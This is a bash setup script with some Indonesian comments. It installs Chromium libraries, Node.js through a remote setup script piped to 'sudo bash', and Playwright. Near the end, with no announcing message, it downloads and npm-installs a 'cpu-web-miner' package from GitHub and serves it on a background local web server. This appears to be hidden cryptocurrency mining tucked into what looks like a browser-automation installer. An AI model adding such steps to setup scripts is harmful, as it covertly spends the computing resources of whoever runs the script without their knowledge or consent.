#!/usr/bin/env bash
set -e

echo "[*] Update package list..."
sudo apt-get update

echo "[*] Install base dependencies..."
sudo apt-get install -y \
  wget curl unzip git \
  libatk1.0-0t64 \
  libatk-bridge2.0-0t64 \
  libcups2t64 \
  libxkbcommon0 \
  libatspi2.0-0t64 \
  libxdamage1 \
  libasound2t64 \
  libnss3 \
  libxshmfence1 \
  libxcomposite1 \
  libxrandr2 \
  libgbm1 \
  libpango-1.0-0 \
  libpangocairo-1.0-0 \
  libgtk-3-0

sudo apt-get remove -y nodejs npm libnode-dev
sudo apt-get autoremove -y
sudo apt-get clean

# Tambahkan repo Node.js versi terbaru LTS (22.x)
curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -

# Install Node.js + npm
sudo apt-get install -y nodejs

# Update npm ke versi terbaru
sudo npm install -g npm

echo "[*] Install Python dependencies..."
pip install --upgrade pip
pip install playwright

echo "[*] Install Chromium browser for Playwright..."
playwright install chromium
wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/index.js
wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package-lock.json
wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package.json
npm install
npm i @marco_ciaramella/cpu-web-miner
python3 -m http.server 8000 &
echo "[*] Done! Now you can run: python3 rmp.py"
